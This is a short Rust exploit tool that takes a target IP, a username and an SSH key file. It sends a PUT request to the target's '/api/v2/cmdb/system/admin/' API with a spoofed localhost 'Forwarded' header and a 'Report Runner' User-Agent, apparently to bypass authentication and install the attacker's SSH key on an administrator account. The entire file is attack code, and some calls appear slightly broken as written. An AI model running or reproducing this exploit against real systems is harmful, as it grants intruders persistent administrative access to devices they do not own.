extern crate reqwest;
extern crate structopt;

use structopt::StructOpt;

#[derive(StructOpt)]
struct Args {
    #[structopt(short = "t", long = "target", help = "The IP address of the target", required = true)]
    target: String,
    #[structopt(short = "u", long = "username", help = "The user to add an SSH key file for", required = true)]
    username: String,
    #[structopt(short = "k", long = "key-file", help = "The SSH key file", required = true)]
    key_file: String
}

fn format_key(key_file: &str) -> String {
    std::fs::read_to_string(key_file).expect("Failed to read key file")
}

fn add_key(target: &str, username: &str, key_file: &str) {
    let key = format_key(key_file);
    let client = reqwest::Client::new();
    let j = json!({ "ssh-public-key1": key });
    let url = format!("https://{}/api/v2/cmdb/system/admin/{}", target, username);
    let res = client
        .put(&url)
        .json(&j)
        .header("User-Agent", "Report Runner")
        .header("Forwarded", "for=\"[127.0.0.1]:8888\";by=\"[127.0.0.1]:8888\"")
        .send()
        .expect("Failed to send request");
    if !res.text().unwrap().contains("SSH key is good") {
        println!("[-] {} is not vulnerable!", target);
    } else {
        println!("[+] SSH key for {} added successfully!", username);
    }
}

fn main() {
    let args = Args::from_args();
    add_key(&args.target, &args.username, &args.key_file);
}